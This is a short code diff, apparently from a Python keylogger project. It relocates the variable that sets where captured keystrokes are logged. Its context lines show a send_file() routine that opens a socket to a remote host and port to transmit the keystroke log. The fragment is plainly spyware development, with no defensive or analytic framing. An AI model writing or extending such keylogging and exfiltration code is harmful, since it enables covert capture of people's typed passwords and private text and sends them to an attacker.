@@ -13,7 +13,7 @@ def send_file():
 
     filename = "file.log"
 
-    PATH = "~/Desktop/keyloggerproj/file.log" #ENTER PATH TO STORE KEYLOG
+    
     #create sender socket
     s = socket.socket()
     print(f"[+] Connecting to {host}:{port}")
@@ -36,7 +36,9 @@ def send_file():
     #close socket
     s.close()
 
-#Tell keylogger where to store file
+
+PATH = "~/Desktop/keyloggerproj/file.log" #ENTER PATH TO STORE KEYLOG
+#Tell keylogger where to store file:
 log_file = os.environ.get('pylogger_file', os.path.expanduser(PATH))
 
 #allow a cancel key for example purposes
